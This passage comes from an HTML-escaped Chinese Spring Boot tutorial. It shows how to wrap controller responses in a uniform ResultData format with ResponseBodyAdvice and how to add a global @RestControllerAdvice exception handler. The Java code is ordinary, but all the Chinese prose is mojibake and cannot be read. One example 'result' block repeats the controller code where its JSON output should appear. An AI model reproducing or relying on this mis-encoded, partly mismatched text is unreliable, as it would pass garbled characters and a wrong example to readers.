&lt;span&gt;&lt;span&gt;class&lt;/span&gt;Â &lt;span&gt;ResponseAdvice&lt;/span&gt;Â &lt;span&gt;implements&lt;/span&gt;Â &lt;span&gt;ResponseBodyAdvice&lt;/span&gt;&amp;lt;&lt;span&gt;Object&lt;/span&gt;&amp;gt;Â &lt;/span&gt;{&lt;br/&gt;Â Â Â Â &lt;span&gt;@Autowired&lt;/span&gt;&lt;br/&gt;Â Â Â Â &lt;span&gt;private&lt;/span&gt;Â ObjectMapperÂ objectMapper;&lt;br/&gt;&lt;br/&gt;Â Â Â Â &lt;span&gt;@Override&lt;/span&gt;&lt;br/&gt;Â Â Â Â &lt;span&gt;&lt;span&gt;public&lt;/span&gt;Â &lt;span&gt;boolean&lt;/span&gt;Â &lt;span&gt;supports&lt;/span&gt;&lt;span&gt;(MethodParameterÂ methodParameter,Â Class&amp;lt;?Â extendsÂ HttpMessageConverter&amp;lt;?&amp;gt;&amp;gt;Â aClass)&lt;/span&gt;Â &lt;/span&gt;{&lt;br/&gt;Â Â Â Â Â Â Â Â &lt;span&gt;return&lt;/span&gt;Â &lt;span&gt;true&lt;/span&gt;;&lt;br/&gt;Â Â Â Â }&lt;br/&gt;&lt;br/&gt;Â Â Â Â &lt;span&gt;@SneakyThrows&lt;/span&gt;&lt;br/&gt;Â Â Â Â &lt;span&gt;@Override&lt;/span&gt;&lt;br/&gt;Â Â Â Â &lt;span&gt;&lt;span&gt;public&lt;/span&gt;Â ObjectÂ &lt;span&gt;beforeBodyWrite&lt;/span&gt;&lt;span&gt;(ObjectÂ o,Â MethodParameterÂ methodParameter,Â MediaTypeÂ mediaType,Â Class&amp;lt;?Â extendsÂ HttpMessageConverter&amp;lt;?&amp;gt;&amp;gt;Â aClass,Â ServerHttpRequestÂ serverHttpRequest,Â ServerHttpResponseÂ serverHttpResponse)&lt;/span&gt;Â &lt;/span&gt;{&lt;br/&gt;Â Â Â Â Â Â Â Â &lt;span&gt;if&lt;/span&gt;(oÂ &lt;span&gt;instanceof&lt;/span&gt;Â String){&lt;br/&gt;Â Â Â Â Â Â Â Â Â Â Â Â &lt;span&gt;return&lt;/span&gt;Â objectMapper.writeValueAsString(ResultData.success(o));&lt;br/&gt;Â Â Â Â Â Â Â Â }Â Â Â Â Â Â Â Â &lt;br/&gt;Â Â Â Â Â Â Â Â &lt;span&gt;return&lt;/span&gt;Â ResultData.success(o);&lt;br/&gt;Â Â Â Â }&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;éœ€è¦æ³¨æ„ä¸¤ä¸ªåœ°æ–¹ï¼š&lt;/p&gt;&lt;ul data-tool=&quot;mdniceç¼–è¾‘å™¨&quot; class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;&lt;code&gt;@RestControllerAdvice&lt;/code&gt;æ³¨è§£&lt;/p&gt;&lt;p&gt;&lt;code&gt;@RestControllerAdvice&lt;/code&gt;æ˜¯&lt;code&gt;@RestController&lt;/code&gt;æ³¨è§£çš„å¢å¼ºï¼Œå¯ä»¥å®ç°ä¸‰ä¸ªæ–¹é¢çš„åŠŸèƒ½ï¼š&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;ol class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;section&gt;å…¨å±€å¼‚å¸¸å¤„ç†&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;å…¨å±€æ•°æ®ç»‘å®š&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;å…¨å±€æ•°æ®é¢„å¤„ç†&lt;/section&gt;&lt;/li&gt;&lt;/ol&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;Stringç±»å‹åˆ¤æ–­&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;pre data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;if&lt;/span&gt;(oÂ &lt;span&gt;instanceof&lt;/span&gt;Â String){&lt;br/&gt;Â Â &lt;span&gt;return&lt;/span&gt;Â objectMapper.writeValueAsString(ResultData.success(o));&lt;br/&gt;}Â &lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;è¿™æ®µä»£ç ä¸€å®šè¦åŠ ï¼Œå¦‚æœControllerç›´æ¥è¿”å›Stringçš„è¯ï¼ŒSpringBootæ˜¯ç›´æ¥è¿”å›ï¼Œæ•…æˆ‘ä»¬éœ€è¦æ‰‹åŠ¨è½¬æ¢æˆjsonã€‚&lt;/p&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;ç»è¿‡ä¸Šé¢çš„å¤„ç†æˆ‘ä»¬å°±å†ä¹Ÿä¸éœ€è¦é€šè¿‡&lt;code&gt;ResultData.success()&lt;/code&gt;æ¥è¿›è¡Œè½¬æ¢äº†ï¼Œç›´æ¥è¿”å›åŸå§‹æ•°æ®æ ¼å¼ï¼ŒSpringBootè‡ªåŠ¨å¸®æˆ‘ä»¬å®ç°åŒ…è£…ç±»çš„å°è£…ã€‚&lt;/p&gt;&lt;pre data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;@GetMapping&lt;/span&gt;(&lt;span&gt;&quot;/hello&quot;&lt;/span&gt;)&lt;br/&gt;&lt;span&gt;&lt;span&gt;public&lt;/span&gt;Â StringÂ &lt;span&gt;getStr&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt;{&lt;br/&gt;Â Â Â Â &lt;span&gt;return&lt;/span&gt;Â &lt;span&gt;&quot;hello,javadaily&quot;&lt;/span&gt;;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;æ­¤æ—¶æˆ‘ä»¬è°ƒç”¨æ¥å£è¿”å›çš„æ•°æ®ç»“æœä¸ºï¼š&lt;/p&gt;&lt;pre data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;&lt;code&gt;@GetMapping(&lt;span&gt;&quot;/hello&quot;&lt;/span&gt;)&lt;br/&gt;publicÂ StringÂ getStr(){&lt;br/&gt;Â Â returnÂ &lt;span&gt;&quot;hello,javadaily&quot;&lt;/span&gt;;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;æ˜¯ä¸æ˜¯æ„Ÿè§‰å¾ˆå®Œç¾ï¼Œåˆ«æ€¥ï¼Œè¿˜æœ‰ä¸ªé—®é¢˜åœ¨ç­‰ç€ä½ å‘¢ã€‚&lt;/p&gt;&lt;figure data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;img data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/PxMzT0Oibf4gOa4vJmA3Iz2aqv8C4e699kLQhjyGc5xic06EVg7GH1ibETk09icl6qvkqDUObSz9U2Fpqnn5dBXz0Q/640?wx_fmt=png&quot; data-type=&quot;png&quot;/&gt;&lt;/figure&gt;&lt;h3 data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;&lt;span&gt;&lt;br/&gt;æ¥å£å¼‚å¸¸é—®é¢˜&lt;/span&gt;&lt;span/&gt;&lt;/h3&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;æ­¤æ—¶æœ‰ä¸ªé—®é¢˜ï¼Œç”±äºæˆ‘ä»¬æ²¡å¯¹Controllerçš„å¼‚å¸¸è¿›è¡Œå¤„ç†ï¼Œå½“æˆ‘ä»¬è°ƒç”¨çš„æ–¹æ³•ä¸€æ—¦å‡ºç°å¼‚å¸¸ï¼Œå°±ä¼šå‡ºç°é—®é¢˜ï¼Œæ¯”å¦‚ä¸‹é¢è¿™ä¸ªæ¥å£&lt;/p&gt;&lt;pre data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;@GetMapping&lt;/span&gt;(&lt;span&gt;&quot;/wrong&quot;&lt;/span&gt;)&lt;br/&gt;&lt;span&gt;&lt;span&gt;public&lt;/span&gt;Â &lt;span&gt;int&lt;/span&gt;Â &lt;span&gt;error&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt;{&lt;br/&gt;Â Â Â Â &lt;span&gt;int&lt;/span&gt;Â iÂ =Â &lt;span&gt;9&lt;/span&gt;/&lt;span&gt;0&lt;/span&gt;;&lt;br/&gt;Â Â Â Â &lt;span&gt;return&lt;/span&gt;Â i;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;è¿”å›çš„ç»“æœä¸ºï¼š&lt;/p&gt;&lt;figure data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;img data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/PxMzT0Oibf4gOa4vJmA3Iz2aqv8C4e699F4vXppP4LAnKTsuvSGEfsU3NulReBHdmsX4Vic8n1EeopTPL8OLwwJw/640?wx_fmt=png&quot; data-type=&quot;png&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;br/&gt;è¿™æ˜¾ç„¶ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„ç»“æœï¼Œæ¥å£éƒ½æŠ¥é”™äº†è¿˜è¿”å›æ“ä½œæˆåŠŸçš„å“åº”ç ï¼Œå‰ç«¯çœ‹äº†ä¼šæ‰“äººçš„ã€‚&lt;/p&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;åˆ«æ€¥ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬è¿›å…¥ç¬¬äºŒä¸ªè®®é¢˜ï¼Œå¦‚ä½•ä¼˜é›…çš„å¤„ç†å…¨å±€å¼‚å¸¸ã€‚&lt;/p&gt;&lt;h2 data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;&lt;span&gt;SpringBootä¸ºä»€ä¹ˆéœ€è¦å…¨å±€å¼‚å¸¸å¤„ç†å™¨&lt;/span&gt;&lt;span/&gt;&lt;/h2&gt;&lt;ol data-tool=&quot;mdniceç¼–è¾‘å™¨&quot; class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;ä¸ç”¨æ‰‹å†™try...catchï¼Œç”±å…¨å±€å¼‚å¸¸å¤„ç†å™¨ç»Ÿä¸€æ•è·&lt;/p&gt;&lt;p&gt;ä½¿ç”¨å…¨å±€å¼‚å¸¸å¤„ç†å™¨æœ€å¤§çš„ä¾¿åˆ©å°±æ˜¯ç¨‹åºå‘˜åœ¨å†™ä»£ç æ—¶ä¸å†éœ€è¦æ‰‹å†™&lt;code&gt;try...catch&lt;/code&gt;äº†ï¼Œå‰é¢æˆ‘ä»¬è®²è¿‡ï¼Œé»˜è®¤æƒ…å†µä¸‹SpringBootå‡ºç°å¼‚å¸¸æ—¶è¿”å›çš„ç»“æœæ˜¯è¿™æ ·ï¼š&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;/ol&gt;&lt;pre data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;&lt;code&gt;{&lt;br/&gt;Â Â &lt;span&gt;&quot;timestamp&quot;&lt;/span&gt;:Â &lt;span&gt;&quot;2021-07-08T08:05:15.423+00:00&quot;&lt;/span&gt;,&lt;br/&gt;Â Â &lt;span&gt;&quot;status&quot;&lt;/span&gt;:Â &lt;span&gt;500&lt;/span&gt;,&lt;br/&gt;Â Â &lt;span&gt;&quot;error&quot;&lt;/span&gt;:Â &lt;span&gt;&quot;InternalÂ ServerÂ Error&quot;&lt;/span&gt;,&lt;br/&gt;Â Â &lt;span&gt;&quot;path&quot;&lt;/span&gt;:Â &lt;span&gt;&quot;/wrong&quot;&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;è¿™ç§æ•°æ®æ ¼å¼è¿”å›ç»™å‰ç«¯ï¼Œå‰ç«¯æ˜¯çœ‹ä¸æ‡‚çš„ï¼Œæ‰€ä»¥è¿™æ—¶å€™æˆ‘ä»¬ä¸€èˆ¬é€šè¿‡&lt;code&gt;try...catch&lt;/code&gt;æ¥å¤„ç†å¼‚å¸¸&lt;/p&gt;&lt;pre data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;@GetMapping&lt;/span&gt;(&lt;span&gt;&quot;/wrong&quot;&lt;/span&gt;)&lt;br/&gt;&lt;span&gt;&lt;span&gt;public&lt;/span&gt;Â &lt;span&gt;int&lt;/span&gt;Â &lt;span&gt;error&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt;{&lt;br/&gt;Â Â Â Â &lt;span&gt;int&lt;/span&gt;Â i;&lt;br/&gt;Â Â Â Â &lt;span&gt;try&lt;/span&gt;{&lt;br/&gt;Â Â Â Â Â Â Â Â iÂ =Â &lt;span&gt;9&lt;/span&gt;/&lt;span&gt;0&lt;/span&gt;;&lt;br/&gt;Â Â Â Â }&lt;span&gt;catch&lt;/span&gt;Â (ExceptionÂ e){&lt;br/&gt;Â Â Â Â Â Â Â Â log.error(&lt;span&gt;&quot;error:{}&quot;&lt;/span&gt;,e);&lt;br/&gt;Â Â Â Â Â Â Â Â iÂ =Â &lt;span&gt;0&lt;/span&gt;;&lt;br/&gt;Â Â Â Â }&lt;br/&gt;Â Â Â Â &lt;span&gt;return&lt;/span&gt;Â i;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;æˆ‘ä»¬è¿½æ±‚çš„ç›®æ ‡è‚¯å®šæ˜¯ä¸éœ€è¦å†æ‰‹åŠ¨å†™&lt;code&gt;try...catch&lt;/code&gt;äº†ï¼Œè€Œæ˜¯å¸Œæœ›ç”±å…¨å±€å¼‚å¸¸å¤„ç†å™¨å¤„ç†ã€‚&lt;/p&gt;&lt;ol start=&quot;2&quot; data-tool=&quot;mdniceç¼–è¾‘å™¨&quot; class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;section&gt;å¯¹äºè‡ªå®šä¹‰å¼‚å¸¸ï¼Œåªèƒ½é€šè¿‡å…¨å±€å¼‚å¸¸å¤„ç†å™¨æ¥å¤„ç†&lt;/section&gt;&lt;/li&gt;&lt;/ol&gt;&lt;pre data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;@GetMapping&lt;/span&gt;(&lt;span&gt;&quot;error1&quot;&lt;/span&gt;)&lt;br/&gt;&lt;span&gt;&lt;span&gt;public&lt;/span&gt;Â &lt;span&gt;void&lt;/span&gt;Â &lt;span&gt;empty&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt;{&lt;br/&gt;Â &lt;span&gt;throw&lt;/span&gt;Â Â &lt;span&gt;new&lt;/span&gt;Â RuntimeException(&lt;span&gt;&quot;è‡ªå®šä¹‰å¼‚å¸¸&quot;&lt;/span&gt;);&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&quot;3&quot; data-tool=&quot;mdniceç¼–è¾‘å™¨&quot; class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;å½“æˆ‘ä»¬å¼•å…¥Validatorå‚æ•°æ ¡éªŒå™¨çš„æ—¶å€™ï¼Œå‚æ•°æ ¡éªŒä¸é€šè¿‡ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œæ­¤æ—¶æ˜¯æ— æ³•ç”¨&lt;code&gt;try...catch&lt;/code&gt;æ•è·çš„ï¼Œåªèƒ½ä½¿ç”¨å…¨å±€å¼‚å¸¸å¤„ç†å™¨ã€‚&lt;/p&gt;&lt;blockquote&gt;&lt;span&gt;â€œ&lt;/span&gt;&lt;p&gt;SpringBooté›†æˆå‚æ•°æ ¡éªŒè¯·å‚è€ƒè¿™ç¯‡æ–‡ç« &lt;a target=&quot;_blank&quot; href=&quot;http://mp.weixin.qq.com/s?__biz=MzAwMTk4NjM1MA==&amp;amp;mid=2247490888&amp;amp;idx=1&amp;amp;sn=dd7c3a4feb185abdca42362000b336d3&amp;amp;chksm=9ad00709ada78e1f04f0d878e03625083abccb5f72b6ae473c6816e2039edf245fe4ac6f50a6&amp;amp;scene=21#wechat_redirect&quot; textvalue=&quot;SpringBootå¼€å‘ç§˜ç± - é›†æˆå‚æ•°æ ¡éªŒåŠé«˜é˜¶æŠ€å·§&quot; data-itemshowtype=&quot;0&quot; tab=&quot;innerlink&quot; data-linktype=&quot;2&quot;&gt;SpringBootå¼€å‘ç§˜ç± - é›†æˆå‚æ•°æ ¡éªŒåŠé«˜é˜¶æŠ€å·§&lt;/a&gt;&lt;/p&gt;&lt;span&gt;â€&lt;/span&gt;&lt;/blockquote&gt;&lt;/section&gt;&lt;/li&gt;&lt;/ol&gt;&lt;h3 data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;&lt;span&gt;å¦‚ä½•å®ç°å…¨å±€å¼‚å¸¸å¤„ç†å™¨&lt;/span&gt;&lt;span/&gt;&lt;/h3&gt;&lt;pre data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;@Slf&lt;/span&gt;4j&lt;br/&gt;&lt;span&gt;@RestControllerAdvice&lt;/span&gt;&lt;br/&gt;&lt;span&gt;public&lt;/span&gt;Â &lt;span&gt;&lt;span&gt;class&lt;/span&gt;Â &lt;span&gt;RestExceptionHandler&lt;/span&gt;Â &lt;/span&gt;{&lt;br/&gt;Â Â Â Â &lt;span&gt;/**&lt;br/&gt;Â Â Â Â Â *Â é»˜è®¤å…¨å±€å¼‚å¸¸å¤„ç†ã€‚&lt;br/&gt;Â Â Â Â Â *Â &lt;span&gt;@param&lt;/span&gt;Â eÂ theÂ e&lt;br/&gt;Â Â Â Â Â *Â &lt;span&gt;@return&lt;/span&gt;Â ResultData&lt;br/&gt;Â Â Â Â Â */&lt;/span&gt;&lt;br/&gt;Â Â Â Â &lt;span&gt;@ExceptionHandler&lt;/span&gt;(Exception&lt;span&gt;.&lt;span&gt;class&lt;/span&gt;)&lt;br/&gt;Â Â Â Â @&lt;span&gt;ResponseStatus&lt;/span&gt;(&lt;span&gt;HttpStatus&lt;/span&gt;.&lt;span&gt;INTERNAL_SERVER_ERROR&lt;/span&gt;)&lt;br/&gt;Â Â Â Â &lt;span&gt;public&lt;/span&gt;Â &lt;span&gt;ResultData&lt;/span&gt;&amp;lt;&lt;span&gt;String&lt;/span&gt;&amp;gt;Â &lt;span&gt;exception&lt;/span&gt;(&lt;span&gt;Exception&lt;/span&gt;Â &lt;span&gt;e&lt;/span&gt;)Â &lt;/span&gt;{&lt;br/&gt;Â Â Â Â Â Â Â Â log.error(&lt;span&gt;&quot;å…¨å±€å¼‚å¸¸ä¿¡æ¯Â ex={}&quot;&lt;/span&gt;,Â e.getMessage(),Â e);&lt;br/&gt;Â Â Â Â Â Â Â Â &lt;span&gt;return&lt;/span&gt;Â ResultData.fail(ReturnCode.RC500.getCode(),e.getMessage());&lt;br/&gt;Â Â Â Â }&lt;br/&gt;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;æœ‰ä¸‰ä¸ªç»†èŠ‚éœ€è¦è¯´æ˜ä¸€ä¸‹ï¼š&lt;/p&gt;&lt;ol data-tool=&quot;mdniceç¼–è¾‘å™¨&quot; class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;&lt;code&gt;@RestControllerAdvice&lt;/code&gt;ï¼ŒRestControllerçš„å¢å¼ºç±»ï¼Œå¯ç”¨äºå®ç°å…¨å±€å¼‚å¸¸å¤„ç†å™¨&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;&lt;code&gt;@ExceptionHandler&lt;/code&gt;,ç»Ÿä¸€å¤„ç†æŸä¸€ç±»å¼‚å¸¸ï¼Œä»è€Œå‡å°‘ä»£ç é‡å¤ç‡å’Œå¤æ‚åº¦ï¼Œæ¯”å¦‚è¦è·å–è‡ªå®šä¹‰å¼‚å¸¸å¯ä»¥&lt;code&gt;@ExceptionHandler(BusinessException.class)&lt;/code&gt;&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;&lt;code&gt;@ResponseStatus&lt;/code&gt;æŒ‡å®šå®¢æˆ·ç«¯æ”¶åˆ°çš„httpçŠ¶æ€ç &lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;/ol&gt;&lt;h3 data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;&lt;span&gt;ä½“éªŒæ•ˆæœ&lt;/span&gt;&lt;span/&gt;&lt;/h3&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;è¿™æ—¶å€™æˆ‘ä»¬è°ƒç”¨å¦‚ä¸‹æ¥å£ï¼š&lt;/p&gt;&lt;pre data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;@GetMapping&lt;/span&gt;(&lt;span&gt;&quot;error1&quot;&lt;/span&gt;)&lt;br/&gt;&lt;span&gt;&lt;span&gt;public&lt;/span&gt;Â &lt;span&gt;void&lt;/span&gt;Â &lt;span&gt;empty&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt;{&lt;br/&gt;Â Â Â Â &lt;span&gt;throw&lt;/span&gt;Â Â &lt;span&gt;new&lt;/span&gt;Â RuntimeException(&lt;span&gt;&quot;è‡ªå®šä¹‰å¼‚å¸¸&quot;&lt;/span&gt;);&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;è¿”å›çš„ç»“æœå¦‚ä¸‹ï¼š&lt;/p&gt;&lt;pre data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;&lt;code&gt;{&lt;br/&gt;Â Â &lt;span&gt;&quot;status&quot;&lt;/span&gt;:Â &lt;span&gt;500&lt;/span&gt;,&lt;br/&gt;Â Â &lt;span&gt;&quot;message&quot;&lt;/span&gt;:Â &lt;span&gt;&quot;è‡ªå®šä¹‰å¼‚å¸¸&quot;&lt;/span&gt;,&lt;br/&gt;Â Â &lt;span&gt;&quot;data&quot;&lt;/span&gt;:Â &lt;span&gt;null&lt;/span&gt;,&lt;br/&gt;Â Â &lt;span&gt;&quot;timestamp&quot;&lt;/span&gt;:Â &lt;span&gt;1625795902556&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;åŸºæœ¬æ»¡è¶³æˆ‘ä»¬çš„éœ€æ±‚äº†ã€‚&lt;/p&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;ä½†æ˜¯å½“æˆ‘ä»¬åŒæ—¶å¯ç”¨ç»Ÿä¸€æ ‡å‡†æ ¼å¼å°è£…åŠŸèƒ½&lt;code&gt;ResponseAdvice&lt;/code&gt;å’Œ&lt;code&gt;RestExceptionHandler&lt;/code&gt;å…¨å±€å¼‚å¸¸å¤„ç†å™¨æ—¶åˆå‡ºç°äº†æ–°çš„é—®é¢˜ï¼š&lt;/p&gt;&lt;pre data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;&lt;code&gt;{&lt;br/&gt;Â Â &lt;span&gt;&quot;status&quot;&lt;/span&gt;:Â &lt;span&gt;100&lt;/span&gt;,&lt;br/&gt;Â Â &lt;span&gt;&quot;message&quot;&lt;/span&gt;:Â &lt;span&gt;&quot;æ“ä½œæˆåŠŸ&quot;&lt;/span&gt;,&lt;br/&gt;Â Â &lt;span&gt;&quot;data&quot;&lt;/span&gt;:Â {&lt;br/&gt;Â Â Â Â &lt;span&gt;&quot;status&quot;&lt;/span&gt;:Â &lt;span&gt;500&lt;/span&gt;,&lt;br/&gt;Â Â Â Â &lt;span&gt;&quot;message&quot;&lt;/span&gt;:Â &lt;span&gt;&quot;è‡ªå®šä¹‰å¼‚å¸¸&quot;&lt;/span&gt;,&lt;br/&gt;Â Â Â Â &lt;span&gt;&quot;data&quot;&lt;/span&gt;:Â &lt;span&gt;null&lt;/span&gt;,&lt;br/&gt;Â Â Â Â &lt;span&gt;&quot;timestamp&quot;&lt;/span&gt;:Â &lt;span&gt;1625796167986&lt;/span&gt;&lt;br/&gt;Â Â },&lt;br/&gt;Â Â &lt;span&gt;&quot;timestamp&quot;&lt;/span&gt;:Â &lt;span&gt;1625796168008&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;æ­¤æ—¶è¿”å›çš„ç»“æœæ˜¯è¿™æ ·ï¼Œç»Ÿä¸€æ ¼å¼å¢å¼ºåŠŸèƒ½ä¼šç»™è¿”å›çš„å¼‚å¸¸ç»“æœå†æ¬¡å°è£…ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦è§£å†³è¿™ä¸ªé—®é¢˜ã€‚&lt;/p&gt;&lt;h3 data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;&lt;span&gt;å…¨å±€å¼‚å¸¸æ¥å…¥è¿”å›çš„æ ‡å‡†æ ¼å¼&lt;/span&gt;&lt;span/&gt;&lt;/h3&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;è¦è®©å…¨å±€å¼‚å¸¸æ¥å…¥æ ‡å‡†æ ¼å¼å¾ˆç®€å•ï¼Œå› ä¸ºå…¨å±€å¼‚å¸¸å¤„ç†å™¨å·²ç»å¸®æˆ‘ä»¬å°è£…å¥½äº†æ ‡å‡†æ ¼å¼ï¼Œæˆ‘ä»¬åªéœ€è¦ç›´æ¥è¿”å›ç»™å®¢æˆ·ç«¯å³å¯ã€‚&lt;/p&gt;&lt;pre data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;@SneakyThrows&lt;/span&gt;&lt;br/&gt;&lt;span&gt;@Override&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;public&lt;/span&gt;Â ObjectÂ &lt;span&gt;beforeBodyWrite&lt;/span&gt;&lt;span&gt;(ObjectÂ o,Â MethodParameterÂ methodParameter,Â MediaTypeÂ mediaType,Â Class&amp;lt;?Â extendsÂ HttpMessageConverter&amp;lt;?&amp;gt;&amp;gt;Â aClass,Â ServerHttpRequestÂ serverHttpRequest,Â ServerHttpResponseÂ serverHttpResponse)&lt;/span&gt;Â &lt;/span&gt;{&lt;br/&gt;Â Â &lt;span&gt;if&lt;/span&gt;(oÂ &lt;span&gt;instanceof&lt;/span&gt;Â String){&lt;br/&gt;Â Â Â Â &lt;span&gt;return&lt;/span&gt;Â objectMapper.writeValueAsString(ResultData.success(o));&lt;br/&gt;Â Â }&lt;br/&gt;Â Â &lt;span&gt;if&lt;/span&gt;(oÂ &lt;span&gt;instanceof&lt;/span&gt;Â ResultData){&lt;br/&gt;Â Â Â Â &lt;span&gt;return&lt;/span&gt;Â o;&lt;br/&gt;Â Â }&lt;br/&gt;Â Â &lt;span&gt;return&lt;/span&gt;Â ResultData.success(o);&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;å…³é”®ä»£ç ï¼š&lt;/p&gt;&lt;pre data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;if&lt;/span&gt;(oÂ &lt;span&gt;instanceof&lt;/span&gt;Â ResultData){&lt;br/&gt;Â Â &lt;span&gt;return&lt;/span&gt;Â o;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;å¦‚æœè¿”å›çš„ç»“æœæ˜¯ResultDataå¯¹è±¡ï¼Œç›´æ¥è¿”å›å³å¯ã€‚&lt;/p&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;è¿™æ—¶å€™æˆ‘ä»¬å†è°ƒç”¨ä¸Šé¢çš„é”™è¯¯æ–¹æ³•ï¼Œè¿”å›çš„ç»“æœå°±ç¬¦åˆæˆ‘ä»¬çš„è¦æ±‚äº†ã€‚&lt;/p&gt;&lt;pre data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;&lt;code&gt;{&lt;br/&gt;Â Â 